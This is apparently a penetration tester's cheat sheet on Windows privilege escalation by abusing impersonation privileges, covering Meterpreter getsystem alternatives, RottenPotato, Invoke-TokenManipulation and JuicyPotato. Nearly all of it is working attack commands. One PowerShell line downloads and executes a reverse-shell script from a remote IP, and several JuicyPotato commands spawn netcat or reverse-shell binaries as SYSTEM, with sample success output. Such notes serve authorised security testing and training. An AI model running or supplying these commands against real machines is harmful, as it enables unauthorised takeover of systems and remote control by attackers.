## EoP - Impersonation Privileges

### Identifier
```bash
whoami /priv
```
![[Pasted image 20210805012521.png]]
### METERPRETER GETSYSTEM AND ALTERNATIVES

```
meterpreter> getsystem 
Tokenvator.exe getsystem cmd.exe 
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe 
psexec -s -i cmd.exe 
python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
```

### ROTTENPOTATO (TOKEN IMPERSONATION)

Binary available at : https://github.com/foxglovesec/RottenPotato Binary available at : https://github.com/breenmachine/RottenPotatoNG

```
getuid
getprivs
use incognito
list\_tokens -u
cd c:\temp\
execute -Hc -f ./rot.exe
impersonate\_token "NT AUTHORITY\SYSTEM"
```

```
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```

### JUICY POTATO (ABUSING THE GOLDEN PRIVILEGES)

Binary available at : https://github.com/ohpe/juicy-potato/releases  
:warning: Juicy Potato doesn’t work in Windows Server 2019.

1.  Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
    
    ```
     whoami /priv
    ```
    
2.  Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object
    
    -   [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise)
    -   [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
    -   [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
    -   [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
    -   [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise)
    -   [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
    -   [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard)
3.  Execute JuicyPotato to run a privileged command.
    
    ```
     JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
     JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
     JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
         Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
         ......
         [+] authresult 0
         {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
         [+] CreateProcessWithTokenW OK
    ```